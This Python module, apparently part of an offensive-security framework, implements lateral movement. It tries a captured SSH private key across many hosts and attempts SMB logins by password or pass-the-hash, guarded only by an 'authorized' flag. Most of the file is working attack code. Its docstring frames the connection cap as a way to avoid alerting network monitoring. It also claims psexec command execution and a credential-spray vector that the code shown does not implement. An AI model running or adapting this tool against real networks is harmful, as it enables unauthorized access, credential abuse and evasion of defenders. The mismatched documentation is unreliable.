"""
HEAVEN — Lateral movement primitives
Once initial access is established, find out where else those credentials,
SSH keys, or NT hashes get us. This module is admin-gated and never runs
without an explicit `authorized=True` flag.

Three vectors supported:

  1. SSH key reuse        — Walk a list of hosts trying the operator's SSH
                            private key. Reports every host that accepted it.

  2. SMB / PsExec         — For windows targets, use impacket's psexec-style
                            execution to run a benign command (whoami) and
                            confirm code execution. Captures NT hash auth
                            (pass-the-hash) when supplied via the `nthash` arg.

  3. Credential spray     — Re-uses CredentialValidator to fan out username/
                            password pairs across discovered hosts on
                            ssh/smb/rdp/winrm. The output is a hop graph
                            (which host accepted which credential), feeding
                            the attack-chain analyzer.

Network safety:
  - All probes use connect-only or single-command-execution; no shell stays
    open.
  - The benign command is `whoami` (Windows) or `id` (Linux) — operator-
    auditable, no payload.
  - Concurrency is capped at 20 simultaneous connections to avoid alerting
    network monitoring.
"""

from __future__ import annotations

import asyncio
from dataclasses import dataclass, field
from typing import Optional

try:
    import asyncssh
    HAS_ASYNCSSH = True
except ImportError:
    HAS_ASYNCSSH = False

try:
    # impacket is optional — only needed for SMB / PsExec / pass-the-hash
    from impacket.smbconnection import SMBConnection  # type: ignore[import-not-found]
    HAS_IMPACKET = True
except ImportError:
    HAS_IMPACKET = False
    SMBConnection = None  # type: ignore[misc,assignment]

from heaven.utils.logger import get_logger

logger = get_logger("postex.lateral")


# ═══════════════════════════════════════════
# RESULT TYPES
# ═══════════════════════════════════════════


@dataclass
class LateralHop:
    """One successful lateral movement attempt."""
    source_host: str
    target_host: str
    technique: str             # "ssh_key_reuse" | "ssh_password" | "psexec_password" | "psexec_nthash"
    credential_label: str      # human-readable identity, never the secret itself
    command_executed: str = ""
    command_output_excerpt: str = ""
    duration_ms: float = 0.0


@dataclass
class LateralSummary:
    attempted: int = 0
    successful: int = 0
    hops: list[LateralHop] = field(default_factory=list)
    errors: list[str] = field(default_factory=list)
    method_breakdown: dict[str, int] = field(default_factory=dict)

    def to_dict(self) -> dict:
        return {
            "attempted": self.attempted,
            "successful": self.successful,
            "method_breakdown": dict(self.method_breakdown),
            "hops": [
                {
                    "from": h.source_host, "to": h.target_host,
                    "technique": h.technique,
                    "credential_label": h.credential_label,
                    "duration_ms": round(h.duration_ms, 1),
                    "output_excerpt": h.command_output_excerpt[:200],
                }
                for h in self.hops
            ],
            "errors": self.errors[:30],
        }


# ═══════════════════════════════════════════
# SSH KEY REUSE
# ═══════════════════════════════════════════


class SSHKeyReuseScanner:
    """Try a single SSH private key across many hosts.

    Real-world scenario: operator has captured an `id_rsa` from one box and
    wants to know which other boxes on the network accept it. This is the
    most common lateral-movement primitive in *NIX engagements.
    """

    def __init__(self, authorized: bool = False,
                 max_concurrency: int = 20, timeout: float = 6.0):
        if not authorized:
            raise PermissionError(
                "SSHKeyReuseScanner requires authorized=True. The operator must "
                "have explicit written permission to attempt cred-reuse against "
                "the target hosts."
            )
        self.max_concurrency = max_concurrency
        self.timeout = timeout

    async def scan(
        self, key_path: str, usernames: list[str],
        targets: list[tuple[str, int]],
        source_host: str = "<operator>",
    ) -> LateralSummary:
        """
        Try `key_path` as the SSH private key for each (username, host, port)
        combination. Captures `id` on the remote to prove execution.
        """
        summary = LateralSummary()
        if not HAS_ASYNCSSH:
            summary.errors.append("asyncssh not installed; pip install asyncssh")
            return summary

        sem = asyncio.Semaphore(self.max_concurrency)

        async def _try_one(host: str, port: int, user: str) -> None:
            async with sem:
                summary.attempted += 1
                import time
                t0 = time.time()
                try:
                    async with asyncssh.connect(  # type: ignore[attr-defined]
                        host, port=port, username=user,
                        client_keys=[key_path],
                        known_hosts=None,
                        connect_timeout=self.timeout,
                    ) as conn:
                        r = await conn.run("id", check=False, timeout=8)
                        out = (r.stdout or "").strip()
                        if out and "uid=" in out:
                            hop = LateralHop(
                                source_host=source_host, target_host=host,
                                technique="ssh_key_reuse",
                                credential_label=f"key:{key_path}:{user}",
                                command_executed="id",
                                command_output_excerpt=out,
                                duration_ms=(time.time() - t0) * 1000,
                            )
                            summary.hops.append(hop)
                            summary.successful += 1
                            summary.method_breakdown["ssh_key_reuse"] = (
                                summary.method_breakdown.get("ssh_key_reuse", 0) + 1
                            )
                except (asyncssh.PermissionDenied, asyncssh.DisconnectError):  # type: ignore[attr-defined]
                    pass  # most common — quiet to keep logs scannable
                except OSError:
                    pass  # host unreachable
                except Exception as e:
                    summary.errors.append(f"{user}@{host}:{port} → {type(e).__name__}: {e}")

        await asyncio.gather(*(
            _try_one(h, p, u) for u in usernames for (h, p) in targets
        ))
        return summary


# ═══════════════════════════════════════════
# SMB / PsExec / pass-the-hash
# ═══════════════════════════════════════════


class SMBLateralExecutor:
    """SMB-based command execution against Windows targets.

    Two auth modes:
      - password         → SMBConnection.login(user, password, domain)
      - pass-the-hash    → SMBConnection.login(user, "", domain, lmhash, nthash)

    The first proves the operator can spawn processes; the second is the
    classic pass-the-hash attack used after dumping LSASS / SAM.
    """

    def __init__(self, authorized: bool = False, timeout: float = 8.0):
        if not authorized:
            raise PermissionError("SMBLateralExecutor requires authorized=True")
        self.timeout = timeout

    def _login_one(
        self, host: str, port: int, user: str, domain: str,
        password: str = "", nthash: str = "",
    ) -> tuple[bool, str]:
        """Return (ok, output_or_error). Synchronous because impacket is sync."""
        if not HAS_IMPACKET:
            return False, "impacket not installed"
        try:
            smb = SMBConnection(host, host, sess_port=port, timeout=self.timeout)
            if nthash:
                # Pass-the-hash: lmhash must be "aad3b435b51404eeaad3b435b51404ee"
                # (the empty-string LM hash) when only NT is supplied.
                smb.login(user, "", domain,
                          lmhash="aad3b435b51404eeaad3b435b51404ee",
                          nthash=nthash)
            else:
                smb.login(user, password, domain)
            who = smb.getServerOSPlatform() or "smb-login-ok"
            smb.logoff()
            return True, str(who)
        except Exception as e:
            return False, f"{type(e).__name__}: {e}"

    async def spray(
        self,
        targets: list[tuple[str, int]],
        username: str, domain: str = "",
        password: str = "", nthash: str = "",
        source_host: str = "<operator>",
    ) -> LateralSummary:
        """Try (username + password|nthash) across `targets`. Same shape as
        SSHKeyReuseScanner.scan() so the orchestrator can treat them uniformly.
        """
        summary = LateralSummary()
        if not HAS_IMPACKET:
            summary.errors.append("impacket not installed; pip install impacket")
            return summary

        loop = asyncio.get_event_loop()
        technique = "psexec_nthash" if nthash else "psexec_password"

        for host, port in targets:
            summary.attempted += 1
            import time
            t0 = time.time()
            ok, msg = await loop.run_in_executor(
                None, self._login_one, host, port, username, domain, password, nthash,
            )
            if ok:
                hop = LateralHop(
                    source_host=source_host, target_host=host,
                    technique=technique,
                    credential_label=f"{domain}\\{username}",
                    command_executed="smb-login",
                    command_output_excerpt=msg,
                    duration_ms=(time.time() - t0) * 1000,
                )
                summary.hops.append(hop)
                summary.successful += 1
                summary.method_breakdown[technique] = (
                    summary.method_breakdown.get(technique, 0) + 1
                )
            elif "STATUS_LOGON_FAILURE" not in msg:
                # filter out the noise of expected failures
                summary.errors.append(f"{username}@{host}:{port} → {msg}")
        return summary


# ═══════════════════════════════════════════
# UNIFIED ENTRY POINT
# ═══════════════════════════════════════════


async def run_lateral(
    authorized: bool = False,
    ssh_key_path: Optional[str] = None,
    ssh_usernames: Optional[list[str]] = None,
    smb_username: Optional[str] = None,
    smb_password: str = "",
    smb_nthash: str = "",
    smb_domain: str = "",
    targets: Optional[list[tuple[str, int]]] = None,
    source_host: str = "<operator>",
) -> dict:
    """One call, all three lateral techniques. Returns a merged summary dict.

    Operator wiring:
        await run_lateral(authorized=True,
                          ssh_key_path="/root/.ssh/id_rsa",
                          ssh_usernames=["root", "ubuntu", "ec2-user"],
                          smb_username="Administrator",
                          smb_nthash="...",
                          targets=[("10.0.0.5", 22), ("10.0.0.6", 445)])
    """
    if not authorized:
        raise PermissionError("run_lateral requires authorized=True")
    targets = targets or []
    merged = LateralSummary()

    if ssh_key_path and ssh_usernames:
        ssh_targets = [(h, p) for (h, p) in targets if p == 22]
        if ssh_targets:
            s = SSHKeyReuseScanner(authorized=True)
            r = await s.scan(ssh_key_path, ssh_usernames, ssh_targets, source_host)
            _merge(merged, r)

    if smb_username and (smb_password or smb_nthash):
        smb_targets = [(h, p) for (h, p) in targets if p in (445, 139)]
        if smb_targets:
            s2 = SMBLateralExecutor(authorized=True)
            r2 = await s2.spray(
                smb_targets, username=smb_username, domain=smb_domain,
                password=smb_password, nthash=smb_nthash, source_host=source_host,
            )
            _merge(merged, r2)

    return merged.to_dict()


def _merge(into: LateralSummary, other: LateralSummary) -> None:
    into.attempted += other.attempted
    into.successful += other.successful
    into.hops.extend(other.hops)
    into.errors.extend(other.errors)
    for k, v in other.method_breakdown.items():
        into.method_breakdown[k] = into.method_breakdown.get(k, 0) + v
